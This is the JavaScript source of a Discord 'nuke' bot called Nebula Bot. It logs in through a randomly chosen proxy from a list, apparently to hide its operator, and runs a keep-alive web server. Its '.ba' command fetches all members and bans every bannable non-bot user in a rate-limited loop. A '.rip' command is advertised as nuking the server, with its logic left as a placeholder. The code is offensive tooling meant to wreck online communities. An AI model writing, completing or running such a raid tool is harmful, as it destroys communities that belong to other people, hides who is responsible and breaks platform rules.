const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

dotenv.config();

// ====== LOAD PROXIES ======
let proxies = [];
try {
  const data = fs.readFileSync('./proxies.txt', 'utf-8');
  proxies = data
    .split('\n')
    .map(line => line.trim())
    .filter(line => line && /^https?:\/\//i.test(line));
  console.log(`✅ Loaded ${proxies.length} proxies.`);
} catch (err) {
  console.warn('⚠️ proxies.txt not found or invalid:', err.message);
}

function getRandomProxyAgent() {
  if (proxies.length === 0) return null;
  const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
  try {
    return new HttpsProxyAgent(proxyUrl);
  } catch (err) {
    console.warn(`⚠️ Invalid proxy format: ${proxyUrl}`);
    return null;
  }
}

// ====== WEB SERVER ======
const app = express();
app.get('/', (req, res) => res.send('Nebula Bot is online'));
app.listen(process.env.PORT || 3000, () => console.log('🌐 Web server running'));

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = Math.max(error.retry_after || 1000, 1000);
        await new Promise(r => setTimeout(r, retryAfter));
        retries++;
      } else if (error.code === 401 || error.code === 403) {
        throw error;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE ======
async function safeLeaveGuild(guild) {
  if (!guild?.available || !guild.members.me) return;
  try {
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Left server');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left');
    } else {
      console.error('⚠️ Leave error:', err.message);
    }
  }
}

// ====== DISCORD CLIENT (NO LOGIN YET) ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== EVENT LISTENERS (Now attached before login) ======

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  console.log(`📩 Received: ${message.content}`); // DEBUG: Check if events fire

  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();

  // ===== DEBUG: Test if commands are detected =====
  console.log(`✅ Command detected: ${command}`);

  // ===== HELP =====
  if (command === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot')
      .addFields(
        { name: '.help', value: 'Shows this message' },
        { name: '.ba', value: 'Bans all members' },
        { name: '.rip', value: 'Nukes the server' }
      )
      .setColor('Red');

    await message.reply({ embeds: [embed] }).catch(console.error);
  }

  // ===== BAN ALL =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BAN_MEMBERS')) {
      return message.reply('❌ No permission');
    }

    await message.reply('🔨 Banning members...');
    const members = await message.guild.members.fetch();
    const toBan = members.filter(m => m.bannable && !m.user.bot);

    for (const member of toBan.values()) {
      await handleRateLimit(() => member.ban({ reason: 'Nebula' })).catch(() => {});
      await new Promise(r => setTimeout(r, 50));
    }

    await message.reply(`✅ Banned ${toBan.size} members`);
  }

  // ===== RIP =====
  if (command === 'rip') {
    await message.reply('💥 Nuking server...');
    // Add your nuke logic here after testing
    await message.channel.send('✅ Test nuke complete');
  }
});

// ====== LOGIN WITH PROXY (Preserves Listeners!) ======
async function login() {
  const token = process.env.TOKEN;
  if (!token) throw new Error('No token in .env');

  const agent = getRandomProxyAgent();
  client.options.agent = agent ? { https: agent } : undefined;

  const proxyInfo = agent ? ` via ${agent.proxy.href}` : '';
  console.log(`🚀 Attempting login${proxyInfo}...`);

  await client.login(token).catch(async err => {
    console.error('❌ Login failed:', err.message);
    console.log('🔁 Falling back to direct connection...');
    client.options.agent = undefined;
    await client.login(token);
  });
}

// Start bot
login().catch(console.error);
